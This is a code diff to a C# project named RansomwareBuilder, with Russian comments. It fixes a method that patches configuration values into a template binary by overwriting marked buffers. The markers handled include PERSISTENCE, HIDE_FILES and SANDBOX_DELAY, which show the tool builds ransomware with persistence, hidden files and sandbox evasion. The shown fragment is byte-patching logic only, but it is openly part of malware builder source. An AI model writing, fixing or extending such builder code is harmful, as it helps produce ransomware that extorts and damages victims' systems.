@@ -768,8 +768,11 @@ namespace RansomwareBuilder
         // ============================================================
         private void PatchBinary(byte[] data, string marker, string value)
 {
-    byte[] markerBytes = Encoding.UTF8.GetBytes(marker);
-    byte[] valueBytes = Encoding.UTF8.GetBytes(value + "\0");
+    // ============================================================
+    // ИСПОЛЬЗУЕМ ASCII (ОДНОБАЙТОВАЯ КОДИРОВКА)
+    // ============================================================
+    byte[] markerBytes = Encoding.ASCII.GetBytes(marker);
+    byte[] valueBytes = Encoding.ASCII.GetBytes(value + "\0");
     
     // ============================================================
     // ЖЕСТКИЕ РАЗМЕРЫ БУФЕРОВ (из template.cpp)
@@ -787,7 +790,7 @@ namespace RansomwareBuilder
              marker.Contains("PERSISTENCE") || marker.Contains("HIDE_FILES") ||
              marker.Contains("SANDBOX_DELAY") || marker.Contains("DELAY"))
     {
-        maxLen = 8; // Для чисел (0 или 1 + нуль-терминатор)
+        maxLen = 8;
     }
     
     for (int i = 0; i < data.Length - markerBytes.Length; i++)
@@ -801,11 +804,9 @@ namespace RansomwareBuilder
         {
             int start = i + markerBytes.Length;
             
-            // Копируем значение
             int copyLen = Math.Min(valueBytes.Length, maxLen);
             Array.Copy(valueBytes, 0, data, start, copyLen);
             
-            // Обнуляем остаток буфера
             for (int k = start + copyLen; k < start + maxLen; k++)
                 data[k] = 0;
             
